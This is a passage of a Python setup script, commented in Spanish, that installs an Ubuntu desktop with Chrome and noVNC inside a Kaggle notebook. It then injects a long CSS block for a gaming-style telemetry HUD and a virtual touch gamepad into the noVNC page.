                    print(f"  [✓] Sistema SquashFS extraído en {time.time() - t_decomp:.2f} segundos!", flush=True)

        # NIVEL 2: Stream Zstandard Multi-Núcleo AVX-512 (~1.0s - 1.5s)
        if not squash_mounted:
            # Buscar paquete tar Zstandard si squashfs no se pudo procesar
            tar_candidates = (
                list(master_dataset_path.rglob("ubuntu_master_rootfs.tar.data")) or
                list(master_dataset_path.rglob("ubuntu_master_rootfs.tar.zst")) or
                list(master_dataset_path.rglob("*.tar.data")) or
                list(master_dataset_path.rglob("*.tar.zst"))
            )
            if tar_candidates:
                rootfs_file = tar_candidates[0]
                is_zstd = True
                magic_bytes = b"\x28\xb5\x2f\xfd"

            # Asegurar binario zstd
            if not shutil.which("zstd"):
                subprocess.run("dpkg -i /kaggle/input/*/apt_archives/zstd*.deb 2>/dev/null || (apt-get update -qq && apt-get install -y -qq zstd >/dev/null 2>&1) || true", shell=True)

            if is_zstd or (shutil.which("zstd") and magic_bytes == b"\x28\xb5\x2f\xfd"):
                print("  ⚡ [Nivel 2 Big Tech] Descomprimiendo RootFS con Zstandard Multi-Núcleo (-T0 AVX)...", flush=True)
                res_zstd = subprocess.run(
                    f"zstd -dc -T0 '{rootfs_file}' | tar -xf - -C / --warning=no-timestamp --no-same-owner >> {LOG_FILE} 2>&1",
                    shell=True
                )
                if res_zstd.returncode == 0:
                    print(f"  [✓] Sistema Ubuntu 100% activado en {time.time() - t_decomp:.2f} segundos!", flush=True)
                else:
                    is_zstd = False

            # NIVEL 3: Fallback Clásico Pigz / Gzip
            if not is_zstd:
                print("  🔄 [Nivel 3] Activando RootFS con motor de compatibilidad Pigz...", flush=True)
                subprocess.run(
                    f"which pigz >/dev/null 2>&1 && (pigz -dc '{rootfs_file}' | tar -xf - -C / --warning=no-timestamp >> {LOG_FILE} 2>&1) || tar -xzf '{rootfs_file}' -C / >> {LOG_FILE} 2>&1",
                    shell=True
                )
                print(f"  [✓] Sistema activado en {time.time() - t_decomp:.2f} segundos.", flush=True)
    elif master_archives_dir and master_archives_dir.exists():
        deb_count = len(list(master_archives_dir.glob("*.deb")))
        print(f"  [✓] Base de Datos de 100GB detectada en {master_dataset_path.name} ({deb_count} paquetes .deb)", flush=True)
        print("  [✓] Activando entorno Ubuntu instantáneamente (0 MB descargados)...", flush=True)
        log(f"Cargando {deb_count} paquetes base desde Dataset: {master_archives_dir}")
        
        # 1. Configuración del entorno de instalación DPKG 100% no interactivo y aceleración I/O
        os.environ["DEBIAN_FRONTEND"] = "noninteractive"
        os.environ["NEEDRESTART_MODE"] = "a"
        os.environ["NEEDRESTART_SUSPEND"] = "1"
        os.environ["TMPDIR"] = "/tmp"
        os.environ["PIP_CACHE_DIR"] = "/tmp/pip_cache"
        os.environ["XDG_CACHE_HOME"] = "/tmp/.cache"
        os.environ["HF_HOME"] = "/tmp/hf_cache"
        os.environ["TORCH_HOME"] = "/tmp/torch_cache"
        subprocess.run("dpkg --add-architecture i386", shell=True)
        subprocess.run("mkdir -p /etc/dpkg/dpkg.cfg.d && echo 'force-unsafe-io' > /etc/dpkg/dpkg.cfg.d/02apt-speedup 2>/dev/null || true", shell=True)
        subprocess.run("mkdir -p /etc/apt/apt.conf.d && echo 'Dpkg::Options { \"--force-confdef\"; \"--force-confold\"; \"--force-unsafe-io\"; }; Dir::Cache::pkgcache \"\"; Dir::Cache::srcpkgcache \"\"; APT::Keep-Downloaded-Packages \"0\";' > /etc/apt/apt.conf.d/99force-conf 2>/dev/null || true", shell=True)
        subprocess.run("echo 'man-db man-db/auto-update boolean false' | debconf-set-selections 2>/dev/null || true", shell=True)
        subprocess.run("dpkg-divert --divert /usr/bin/mandb.real --rename /usr/bin/mandb 2>/dev/null || true; ln -sf /bin/true /usr/bin/mandb 2>/dev/null || true", shell=True)
        subprocess.run("dpkg-divert --divert /usr/sbin/update-initramfs.real --rename /usr/sbin/update-initramfs 2>/dev/null || true; ln -sf /bin/true /usr/sbin/update-initramfs 2>/dev/null || true", shell=True)

        # 2. Desempaquetado masivo con dpkg -i -R (Modo Recursivo Nativo + I/O Acelerado)
        print("  [1/3] Extrayendo 1,109 paquetes oficiales del Dataset con aceleración I/O...", flush=True)
        res_dpkg = subprocess.run(f"DEBIAN_FRONTEND=noninteractive dpkg -i -R --force-all --force-unsafe-io --no-triggers '{master_archives_dir}' >> {LOG_FILE} 2>&1", shell=True)
        if res_dpkg.returncode != 0:
            log(f"Aviso en dpkg unpack (código {res_dpkg.returncode}). Continuando con configuración...", "WARNING")

        # 3. Configuración y resolución de dependencias del sistema
        print("  [2/3] Configurando entorno del sistema y servicios base...", flush=True)
        res_conf = subprocess.run(f"DEBIAN_FRONTEND=noninteractive dpkg --configure -a --force-unsafe-io >> {LOG_FILE} 2>&1", shell=True)
        subprocess.run(f"DEBIAN_FRONTEND=noninteractive apt-get install -f -y >> {LOG_FILE} 2>&1 || true", shell=True)
    
    # 4. Reutilizar noVNC pre-empaquetado si está presente
    print("  [3/3] Configurando noVNC WebRTC y Google Chrome...", flush=True)
    novnc_dir = Path("/opt/noVNC")
    novnc_dir.parent.mkdir(parents=True, exist_ok=True)
    if not (novnc_dir / "vnc.html").exists():
        found_novnc_tar = list(master_dataset_path.rglob("noVNC.tar"))
        if found_novnc_tar:
            print("  ⚡ Extrayendo noVNC pre-empaquetado instantáneamente...", flush=True)
            subprocess.run(f"tar -xf '{found_novnc_tar[0]}' -C /opt/ >> {LOG_FILE} 2>&1 || true", shell=True)
        if not (novnc_dir / "vnc.html").exists():
            found_novnc = list(master_dataset_path.rglob("noVNC"))
            if found_novnc and found_novnc[0].is_dir():
                try:
                    shutil.copytree(found_novnc[0], novnc_dir)
                except Exception:
                    pass
        if not (novnc_dir / "vnc.html").exists():
            subprocess.run(f"git clone --depth 1 https://github.com/novnc/noVNC.git /opt/noVNC >> {LOG_FILE} 2>&1", shell=True)
            subprocess.run(f"git clone --depth 1 https://github.com/novnc/websockify /opt/noVNC/utils/websockify >> {LOG_FILE} 2>&1", shell=True)
    subprocess.run("chmod -R +x /opt/noVNC/utils 2>/dev/null || true", shell=True)
    try:
        if not Path("/kaggle/working/noVNC").exists():
            os.symlink("/opt/noVNC", "/kaggle/working/noVNC")
    except Exception:
        pass
            
    # Instalar Google Chrome pre-empaquetado
    chrome_debs = list(master_dataset_path.rglob("google-chrome*.deb"))
    if chrome_debs:
        subprocess.run(f"DEBIAN_FRONTEND=noninteractive dpkg -i --force-unsafe-io {chrome_debs[0]} >> {LOG_FILE} 2>&1 || true", shell=True)
        
    # 5. Ejecutar setup.py de Database 1 para periféricos y lanzadores
    found_setup = list(master_dataset_path.rglob("setup.py"))
    if found_setup:
        print("  🎮 Configurando lanzadores de escritorio y periféricos de Database 1...", flush=True)
        subprocess.run(f"python3 '{found_setup[0]}' >> {LOG_FILE} 2>&1 || true", shell=True)

    try:
        import pyngrok, websockets, aiohttp, PIL, mss, edge_tts
        print("  ⚡ [✓] Módulos de Python ya disponibles en memoria. Omitiendo pip install (Ahorro de 65s)!", flush=True)
    except ImportError:
        print("  📦 Instalando módulos de Python complementarios...", flush=True)
        subprocess.run(f"pip install -q --no-warn-script-location pyngrok websockets aiohttp Pillow mss edge-tts python-dotenv openai >> {LOG_FILE} 2>&1", shell=True)
    print("  ✅ [✓] Suite Oficial de Ubuntu activada con éxito desde Dataset (0 MB descargados).", flush=True)
else:
    # Método tradicional de descarga e instalación bajo demanda
    log("Instalando paquetes oficiales de Ubuntu bajo demanda...")
    subprocess.run("rm -rf /etc/apt/sources.list.d/* 2>/dev/null || true", shell=True)

    # Descargar o reutilizar Google Chrome Oficial desde caché de Drive
    chrome_deb = Path("/kaggle/working/google-chrome-stable_current_amd64.deb")
    gdrive_cache_deb = Path("/root/gdrive/Cloud_PC/Cache/google-chrome-stable_current_amd64.deb")

    if gdrive_cache_deb.exists() and gdrive_cache_deb.stat().st_size > 50_000_000:
        print("  ⚡ [✓] Reutilizando Google Chrome desde caché de Google Drive...", flush=True)
        try:
            shutil.copy2(gdrive_cache_deb, chrome_deb)
        except Exception:
            pass

    if not chrome_deb.exists() or chrome_deb.stat().st_size < 1000:
        subprocess.run(
            "wget -q https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb -O /kaggle/working/google-chrome-stable_current_amd64.deb",
            shell=True
        )
        if chrome_deb.exists() and chrome_deb.stat().st_size > 50_000_000 and os.path.exists("/root/gdrive"):
            try:
                os.makedirs("/root/gdrive/Cloud_PC/Cache", exist_ok=True)
                shutil.copy2(chrome_deb, gdrive_cache_deb)
            except Exception:
                pass

    if chrome_deb.exists():
        all_pkgs.append(str(chrome_deb))

    cmd_install = (
        "apt-get update -qq && "
        f"DEBIAN_FRONTEND=noninteractive apt-get install -y {' '.join(all_pkgs)} >> {LOG_FILE} 2>&1 && "
        "apt-get clean && rm -rf /var/cache/apt/archives/* /var/lib/apt/lists/* && "
        "rm -f /kaggle/working/google-chrome-stable_current_amd64.deb"
    )
    subprocess.run(cmd_install, shell=True)
    subprocess.run(f"pip install -q pyngrok websockets aiohttp Pillow mss edge-tts python-dotenv openai >> {LOG_FILE} 2>&1", shell=True)
    print("  ✅ [✓] Suite Oficial de Ubuntu instalada con éxito.", flush=True)

# Descargar noVNC si no existe
novnc_dir = Path("/opt/noVNC")
novnc_dir.parent.mkdir(parents=True, exist_ok=True)
if not novnc_dir.exists():
    subprocess.run(f"git clone --depth 1 https://github.com/novnc/noVNC.git /opt/noVNC >> {LOG_FILE} 2>&1", shell=True)
    subprocess.run(f"git clone --depth 1 https://github.com/novnc/websockify /opt/noVNC/utils/websockify >> {LOG_FILE} 2>&1", shell=True)
    subprocess.run("chmod -R +x /opt/noVNC/utils 2>/dev/null || true", shell=True)
    try:
        if not Path("/kaggle/working/noVNC").exists():
            os.symlink("/opt/noVNC", "/kaggle/working/noVNC")
    except Exception:
        pass

# Inyectar HUD Cyberpunk de 60 FPS & PING en tiempo real en la interfaz de noVNC
try:
    vnc_html = novnc_dir / "vnc.html"
    if vnc_html.exists():
        content = vnc_html.read_text(encoding="utf-8")
        if "cloud-hud-overlay" not in content:
            hud_code = """
<style>
:root {
    --safe-top: env(safe-area-inset-top, 0px);
    --safe-bottom: env(safe-area-inset-bottom, 0px);
    --safe-left: env(safe-area-inset-left, 0px);
    --safe-right: env(safe-area-inset-right, 0px);
    --aether-cyan: #00ffc8;
    --aether-blue: #38bdf8;
    --aether-pink: #ff2a85;
}

/* ========================================================================== */
/* ========================================================================== */
/* 1. STREAM TELEMETRY HUD (ESTÁNDAR GAMING GEFORCE NOW CTRL+N & STEAM DECK)  */
/* ========================================================================== */
#cloud-perf-badge {
    position: fixed;
    bottom: calc(10px + var(--safe-bottom));
    left: calc(12px + var(--safe-left));
    background: rgba(10, 15, 26, 0.82);
    backdrop-filter: blur(16px) saturate(180%);
    -webkit-backdrop-filter: blur(16px) saturate(180%);
    border: 1px solid rgba(0, 255, 200, 0.32);
    border-radius: 9999px;
    padding: 5px 12px;
    display: flex;
    align-items: center;
    gap: 8px;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace;
    font-size: 11px;
    font-weight: 700;
    color: #f8fafc;
    z-index: 999980;
    cursor: pointer;
    user-select: none;
    touch-action: manipulation;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.65), 0 0 10px rgba(0, 255, 200, 0.15);
    line-height: 1;
    transition: all 0.28s cubic-bezier(0.16, 1, 0.3, 1);
}
#cloud-perf-badge:hover, #cloud-perf-badge:active {
    background: rgba(13, 20, 36, 0.95);
    border-color: var(--aether-cyan);
    box-shadow: 0 6px 24px rgba(0, 0, 0, 0.8), 0 0 16px rgba(0, 255, 200, 0.35);
    transform: scale(1.03);
}
#cloud-perf-badge .perf-dot {
    width: 7px;
    height: 7px;
    border-radius: 50%;
    background: var(--aether-cyan);
    box-shadow: 0 0 8px var(--aether-cyan);
    animation: perf-pulse 2s infinite ease-in-out;
}
@keyframes perf-pulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.65; transform: scale(0.85); }
}
.hud-metric {
    display: inline-flex;
    align-items: baseline;
    gap: 2px;
}
.hud-val {
    font-size: 12px;
    font-weight: 800;
    letter-spacing: -0.2px;
}
.fps-val { color: var(--aether-cyan); }
.ping-val { color: var(--aether-blue); }
.hud-unit {
    font-size: 9px;
    font-weight: 600;
    color: rgba(255, 255, 255, 0.50);
    text-transform: uppercase;
}
.hud-sep {
    width: 1px;
    height: 11px;
    background: rgba(255, 255, 255, 0.18);
}
.hud-signal {
    width: 14px;
    height: 11px;
    display: inline-flex;
    align-items: flex-end;
    gap: 1.5px;
}
.hud-signal .bar {
    width: 2.5px;
    background: rgba(255, 255, 255, 0.20);
    border-radius: 1px;
    transition: background 0.25s ease;
}
.hud-signal .b1 { height: 3px; }
.hud-signal .b2 { height: 6px; }
.hud-signal .b3 { height: 9px; }
.hud-signal .b4 { height: 11px; }
.hud-signal.lvl-4 .bar { background: #00ffc8; }
.hud-signal.lvl-3 .b1, .hud-signal.lvl-3 .b2, .hud-signal.lvl-3 .b3 { background: #00ffc8; }
.hud-signal.lvl-2 .b1, .hud-signal.lvl-2 .b2 { background: #facc15; }
.hud-signal.lvl-1 .b1 { background: #f43f5e; }

.hud-tag {
    font-size: 9.5px;
    font-weight: 700;
    padding: 1.5px 5px;
    border-radius: 4px;
    background: rgba(0, 255, 200, 0.15);
    color: var(--aether-cyan);
    border: 1px solid rgba(0, 255, 200, 0.3);
}

/* Panel de Diagnóstico Telemétrico Expandido (GeForce NOW Ctrl+N Standard) */
#cloud-telemetry-panel {
    position: fixed;
    bottom: calc(52px + var(--safe-bottom));
    left: calc(12px + var(--safe-left));
    background: rgba(10, 15, 26, 0.92);
    backdrop-filter: blur(28px) saturate(190%);
    -webkit-backdrop-filter: blur(28px) saturate(190%);
    border: 1px solid rgba(0, 255, 200, 0.35);
    border-radius: 14px;
    padding: 12px 14px;
    width: min(280px, 86vw);
    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.8), 0 0 20px rgba(0, 255, 200, 0.2);
    z-index: 999985;
    opacity: 0;
    pointer-events: none;
    transform: translateY(10px) scale(0.95);
    transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    color: #f8fafc;
    user-select: none;
}
#cloud-telemetry-panel.open {
    opacity: 1;
    pointer-events: auto;
    transform: translateY(0) scale(1);
}
.telem-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding-bottom: 8px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    margin-bottom: 8px;
}
.telem-title {
    font-size: 11px;
    font-weight: 800;
    color: var(--aether-cyan);
    text-transform: uppercase;
    letter-spacing: 0.8px;
}
.telem-close {
    cursor: pointer;
    color: rgba(255, 255, 255, 0.5);
    display: flex;
    align-items: center;
    padding: 2px;
}
.telem-close:hover { color: #f8fafc; }
.telem-grid {
    display: flex;
    flex-direction: column;
    gap: 6px;
}
.telem-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    font-size: 11px;
}
.telem-key {
    color: rgba(255, 255, 255, 0.6);
    font-weight: 500;
}
.telem-val {
    font-weight: 700;
    color: #f8fafc;
}
.telem-val.cyan { color: var(--aether-cyan); }
.telem-val.blue { color: var(--aether-blue); }

/* Auto-reubicación cuando los mandos están activos */
body.tp-gamepad-active #cloud-perf-badge {
    bottom: auto;
    top: calc(10px + var(--safe-top));
    left: calc(125px + var(--safe-left));
}
body.tp-gamepad-active #cloud-telemetry-panel {
    bottom: auto;
    top: calc(48px + var(--safe-top));
    left: calc(125px + var(--safe-left));
}

/* ========================================================================== */
/* Ocultar barra antigua y conflictiva nativa de noVNC */
#noVNC_control_bar_anchor, #noVNC_control_bar {
    display: none !important;
}

/* ========================================================================== */
/* 2. PESTAÑA LATERAL AETHER (MARGEN IZQUIERDO, PULGAR NATURAL A 42%)         */
/* ========================================================================== */
#aether-edge-tab {
    position: fixed;
    left: 0;
    right: auto;
    top: 42%;
    width: 28px;
    height: 56px;
    background: rgba(13, 18, 30, 0.50);
    backdrop-filter: blur(16px);
    -webkit-backdrop-filter: blur(16px);
    border: 1.5px solid rgba(0, 255, 200, 0.35);
    border-left: none;
    border-radius: 0 16px 16px 0;
    display: flex;
    align-items: center;
    justify-content: center;
    color: var(--aether-cyan);
    z-index: 999990;
    cursor: pointer;
    touch-action: none;
    user-select: none;
    opacity: 0.35; /* Discreto en reposo estilo Apple HIG / Xbox TAK */
    transition: opacity 0.25s ease, background 0.2s ease, width 0.2s ease, box-shadow 0.25s ease;
    box-shadow: 3px 0 14px rgba(0, 255, 200, 0.2);
}
/* Hitbox expandido invisible de 60px para el pulgar izquierdo */
#aether-edge-tab::before {
    content: "";
    position: absolute;
    left: 0;
    right: auto;
    top: -15px;
    width: 60px;
    height: 86px;
}
#aether-edge-tab:hover, #aether-edge-tab:active, #aether-edge-tab.active {
    opacity: 0.95 !important;
    background: rgba(13, 18, 30, 0.92);
    width: 36px;
    box-shadow: 4px 0 22px rgba(0, 255, 200, 0.5);
}

/* Scrim translúcido con desenfoque de fondo */
#aether-scrim {
    position: fixed;
    top: 0; left: 0; width: 100vw; height: 100vh;
    background: rgba(0, 0, 0, 0.45);
    backdrop-filter: blur(6px);
    -webkit-backdrop-filter: blur(6px);
    z-index: 999995;
    opacity: 0;
    pointer-events: none;
    touch-action: none;
    transition: opacity 0.25s ease;
}
#aether-scrim.open {
    opacity: 1;
    pointer-events: auto;
}

/* Cajón Lateral Desplegable (Side Drawer - Cristal Líquido / Margen Izquierdo) */
#aether-drawer {
    position: fixed;
    left: 0;
    right: auto;
    top: 0;
    width: min(280px, 84vw);
    height: 100vh;
    background: rgba(10, 15, 26, 0.88);
    backdrop-filter: blur(30px) saturate(180%);
    -webkit-backdrop-filter: blur(30px) saturate(180%);
    border-right: 1px solid rgba(0, 255, 200, 0.25);
    border-left: none;
    box-shadow: 10px 0 45px rgba(0, 0, 0, 0.85);
    z-index: 999998;
    transform: translate3d(-100%, 0, 0);
    transition: transform 0.28s cubic-bezier(0.16, 1, 0.3, 1);
    display: flex;
    flex-direction: column;
    padding: calc(14px + var(--safe-top)) 14px calc(14px + var(--safe-bottom)) calc(14px + var(--safe-left));
    box-sizing: border-box;
    color: #f8fafc;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    user-select: none;
    touch-action: none;
}
#aether-drawer.open {
    transform: translate3d(0, 0, 0);
}
.drawer-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding-bottom: 12px;
    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
    margin-bottom: 12px;
}
.drawer-title {
    font-size: 13.5px;
    font-weight: 700;
    color: var(--aether-cyan);
    display: flex;
    align-items: center;
    gap: 6px;
    letter-spacing: 0.5px;
    text-shadow: 0 0 10px rgba(0, 255, 200, 0.3);
}
.drawer-close {
    background: rgba(255, 255, 255, 0.08);
    border: 1px solid rgba(255, 255, 255, 0.18);
    color: #e2e8f0;
    border-radius: 50%;
    width: 28px;
    height: 28px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 16px;
    cursor: pointer;
    touch-action: manipulation;
    transition: background 0.15s ease;
}
.drawer-close:active {
    background: rgba(255, 255, 255, 0.2);
}
.drawer-items {
    display: flex;
    flex-direction: column;
    gap: 8px;
    flex: 1;
    overflow-y: auto;
    -webkit-overflow-scrolling: touch;
    touch-action: pan-y;
}
.drawer-btn {
    background: rgba(255, 255, 255, 0.05);
    border: 1px solid rgba(255, 255, 255, 0.1);
    border-radius: 12px;
    padding: 8px 12px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    color: #f8fafc;
    font-size: 12px;
    font-weight: 600;
    cursor: pointer;
    touch-action: manipulation;
    transition: all 0.2s ease;
}
.drawer-btn:hover, .drawer-btn:active {
    background: rgba(0, 255, 200, 0.15);
    border-color: var(--aether-cyan);
    color: #f8fafc;
}
.drawer-btn.active-glow {
    background: rgba(0, 255, 200, 0.16);
    border-color: var(--aether-cyan);
    color: #f8fafc;
    box-shadow: 0 0 12px rgba(0, 255, 200, 0.25);
}
.drawer-btn-left {
    display: flex;
    align-items: center;
    gap: 10px;
}
.drawer-pill {
    font-size: 9.5px;
    font-weight: 700;
    padding: 2.5px 8px;
    border-radius: 9999px;
    background: rgba(255, 255, 255, 0.08);
    color: rgba(255, 255, 255, 0.60);
    border: 1px solid rgba(255, 255, 255, 0.14);
    letter-spacing: 0.3px;
    transition: all 0.2s ease;
}
.drawer-pill.active {
    background: rgba(0, 255, 200, 0.20);
    color: var(--aether-cyan);
    border-color: var(--aether-cyan);
    box-shadow: 0 0 8px rgba(0, 255, 200, 0.3);
}
.drawer-btn .d-icon {
    width: 20px;
    height: 20px;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    color: currentColor;
}
.drawer-btn .d-icon svg {
    width: 100%;
    height: 100%;
    stroke: currentColor;
    fill: none;
}
.drawer-footer {
    padding-top: 12px;
    border-top: 1px solid rgba(255, 255, 255, 0.1);
    display: flex;
    flex-direction: column;
    gap: 8px;
}
.drawer-exit-btn {
    background: rgba(255, 42, 133, 0.16);
    border: 1px solid rgba(255, 42, 133, 0.35);
    border-radius: 10px;
    padding: 8px 12px;
    color: var(--aether-pink);
    font-size: 12px;
    font-weight: 700;
    cursor: pointer;
    text-align: center;
    transition: background 0.2s;
}
.drawer-exit-btn:hover, .drawer-exit-btn:active {
    background: rgba(255, 42, 133, 0.32);
}

/* Soporte ergonómico para smartphones en horizontal (Landscape) */
@media (max-height: 520px) {
    #aether-drawer {
        width: min(250px, 78vw);
        padding: calc(8px + var(--safe-top)) 10px calc(8px + var(--safe-bottom)) calc(10px + var(--safe-left));
    }
    .drawer-header {
        margin-bottom: 6px;
        padding-bottom: 6px;
    }
    .drawer-items {
        gap: 5px;
    }
    .drawer-btn {
        padding: 7px 10px;
        font-size: 11px;
    }
}

/* ========================================================================== */
/* 3. CAPA DE MANDOS VIRTUALES TÁCTILES: XBOX TAK FUSION + CRISTAL LÍQUIDO    */
/* ========================================================================== */
#virtual-gamepad-overlay {
    position: fixed;
    top: 0; left: 0; width: 100vw; height: 100vh;
    pointer-events: none;
    z-index: 999970;
    user-select: none;
    touch-action: none;
    display: none;
}
#virtual-gamepad-overlay.visible {
    display: block;
}

/* Joystick Analógico Izquierdo con Deadzone y Resorte Elástico */
.gp-stick-zone {
    position: absolute;
    bottom: calc(18px + var(--safe-bottom));
    left: calc(18px + var(--safe-left));
    width: 140px;
    height: 140px;
    pointer-events: auto;
    touch-action: none;
}
/* Joystick Analógico Derecho (Cámara 3D y Apuntar) */
.gp-right-stick-zone {
    left: auto !important;
    right: calc(180px + var(--safe-right));
    bottom: calc(22px + var(--safe-bottom));
}
.gp-stick-base {
    position: absolute;
    width: 130px;
    height: 130px;
    border-radius: 50%;
    background: rgba(15, 23, 42, 0.38);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    border: 1.5px solid rgba(0, 255, 200, 0.35);
    box-shadow: 0 0 16px rgba(0, 255, 200, 0.15), inset 0 0 10px rgba(0,0,0,0.5);
    display: flex;
    align-items: center;
    justify-content: center;
}
.gp-stick-thumb {
    width: 52px;
    height: 52px;
    border-radius: 50%;
    background: radial-gradient(circle, #1e293b 0%, #0f172a 100%);
    border: 2px solid var(--aether-cyan);
    box-shadow: 0 0 12px var(--aether-cyan);
    transform: translate3d(0, 0, 0);
    will-change: transform;
    pointer-events: none;
}

/* D-Pad / Cruceta Táctil */
.gp-dpad-container {
    position: absolute;
    bottom: calc(166px + var(--safe-bottom));
    left: calc(36px + var(--safe-left));
    width: 104px;
    height: 104px;
    pointer-events: auto;
}
.gp-dpad-btn {
    position: absolute;
    width: 34px;
    height: 34px;
    background: rgba(15, 23, 42, 0.45);
    backdrop-filter: blur(8px);
    -webkit-backdrop-filter: blur(8px);
    border: 1px solid rgba(56, 189, 248, 0.35);
    border-radius: 9px;
    color: var(--aether-blue);
    font-size: 13px;
    font-weight: 700;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    touch-action: none;
    transition: transform 0.08s ease, background 0.1s ease;
}
.gp-dpad-btn:active, .gp-dpad-btn.pressed {
    background: rgba(56, 189, 248, 0.45);
    border-color: var(--aether-blue);
    box-shadow: 0 0 12px var(--aether-blue);
    transform: scale(0.92);
}
.gp-dpad-up { top: 0; left: 35px; }
.gp-dpad-down { bottom: 0; left: 35px; }
.gp-dpad-left { top: 35px; left: 0; }
.gp-dpad-right { top: 35px; right: 0; }

/* Botones de Acción ABXY (Diamante Anatómico Xbox Classic + Neón) */
.gp-abxy-container {
    position: absolute;
    bottom: calc(22px + var(--safe-bottom));
    right: calc(22px + var(--safe-right));
    width: 144px;
    height: 144px;
    pointer-events: auto;
}
.gp-action-btn {
    position: absolute;
    width: 46px;
    height: 46px;
    border-radius: 50%;
    background: rgba(15, 23, 42, 0.45);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 16px;
    font-weight: 800;
    cursor: pointer;
    touch-action: none;
    box-shadow: 0 4px 14px rgba(0, 0, 0, 0.4);
    transition: transform 0.08s ease, background 0.1s ease, box-shadow 0.1s ease;
}
.gp-action-btn:active, .gp-action-btn.pressed {
    transform: scale(0.92);
}
/* Botón A (Verde Neón Xbox) */
.btn-xbox-a {
    bottom: 0; left: 49px;
    border: 2px solid rgba(16, 185, 129, 0.6);
    color: #10b981;
}
.btn-xbox-a.pressed, .btn-xbox-a:active {
    background: rgba(16, 185, 129, 0.6);
    box-shadow: 0 0 20px #10b981;
    color: #ffffff;
}
/* Botón B (Rojo Neón Xbox) */
.btn-xbox-b {
    top: 49px; right: 0;
    border: 2px solid rgba(239, 68, 68, 0.6);
    color: #ef4444;
}
.btn-xbox-b.pressed, .btn-xbox-b:active {
    background: rgba(239, 68, 68, 0.6);
    box-shadow: 0 0 20px #ef4444;
    color: #ffffff;
}
/* Botón X (Azul Eléctrico Xbox) */
.btn-xbox-x {
    top: 49px; left: 0;
    border: 2px solid rgba(59, 130, 246, 0.6);
    color: #3b82f6;
}
.btn-xbox-x.pressed, .btn-xbox-x:active {
    background: rgba(59, 130, 246, 0.6);
    box-shadow: 0 0 20px #3b82f6;
    color: #ffffff;
}
/* Botón Y (Amarillo Oro Xbox) */
.btn-xbox-y {
    top: 0; left: 49px;
    border: 2px solid rgba(245, 158, 11, 0.6);
    color: #f59e0b;
}
.btn-xbox-y.pressed, .btn-xbox-y:active {
    background: rgba(245, 158, 11, 0.6);
    box-shadow: 0 0 20px #f59e0b;
    color: #ffffff;
}

/* Gatillos y Bumpers (LB, RB, LT, RT) con Safe Areas */
.gp-shoulders-container {
    position: absolute;
    top: calc(8px + var(--safe-top));
    width: 100vw;
    display: flex;
    justify-content: space-between;
    padding: 0 calc(14px + var(--safe-right)) 0 calc(14px + var(--safe-left));
    box-sizing: border-box;
    pointer-events: auto;
}
.gp-shoulder-group {
    display: flex;
    gap: 8px;
}
.gp-shoulder-btn {
    background: rgba(15, 23, 42, 0.45);
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px);
    border: 1px solid rgba(0, 255, 200, 0.35);
    border-radius: 9px;
    padding: 7px 16px;
    color: var(--aether-cyan);
    font-size: 11px;
    font-weight: 700;
    cursor: pointer;
    touch-action: none;
    transition: transform 0.08s ease, background 0.1s ease;
}
.gp-shoulder-btn.pressed, .gp-shoulder-btn:active {
    background: rgba(0, 255, 200, 0.45);
    box-shadow: 0 0 14px var(--aether-cyan);
    transform: scale(0.94);
}

/* Botones Centrales (Select / Start) */
.gp-center-container {
    position: absolute;
    top: calc(8px + var(--safe-top));
    left: 50%;
    transform: translateX(-50%);
    display: flex;
    gap: 12px;
    pointer-events: auto;
}
.gp-center-btn {
    background: rgba(15, 23, 42, 0.45);
    backdrop-filter: blur(8px);
    -webkit-backdrop-filter: blur(8px);
    border: 1px solid rgba(255, 255, 255, 0.18);
    border-radius: 7px;
    padding: 5px 12px;
    color: #94a3b8;
    font-size: 10px;
    font-weight: 700;
    cursor: pointer;
    touch-action: none;
    transition: transform 0.08s ease, background 0.1s ease;
}
.gp-center-btn.pressed, .gp-center-btn:active {
    background: rgba(255, 255, 255, 0.35);
    color: #ffffff;
    transform: scale(0.94);
}

/* ========================================================================== */
/* 4. CURSOR VIRTUAL Y ELEMENTOS AUXILIARES                                  */
/* ========================================================================== */
#cloud-virtual-cursor {
    position: fixed; width: 22px; height: 22px; pointer-events: none;
    z-index: 999999; transform: translate3d(0, 0, 0); display: none;
    filter: drop-shadow(0 2px 5px rgba(0,0,0,0.85)); will-change: transform;
}
#cloud-virtual-cursor.cursor-dragging path {
    fill: var(--aether-cyan) !important;
    stroke: #0a0f1a !important;
    filter: drop-shadow(0 0 8px var(--aether-cyan));
}
body.tp-trackpad-mode #cloud-virtual-cursor { display: block; }
body.tp-touch-mode #cloud-virtual-cursor { display: none; }
body.tp-gamepad-active #cloud-virtual-cursor { display: none; }

#cloud-hold-ring {
    position: fixed; width: 44px; height: 44px; pointer-events: none;
    z-index: 999998; transform: translate3d(-50%, -50%, 0) scale(0.6);
    opacity: 0; transition: opacity 0.1s ease, transform 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
}
#cloud-hold-ring.active { opacity: 1; transform: translate3d(-50%, -50%, 0) scale(1); }
#cloud-hold-ring circle.progress {
    stroke-dasharray: 120; stroke-dashoffset: 120; transition: stroke-dashoffset 0.24s linear;
}
#cloud-hold-ring.active circle.progress { stroke-dashoffset: 0; }

.cloud-touch-ripple {
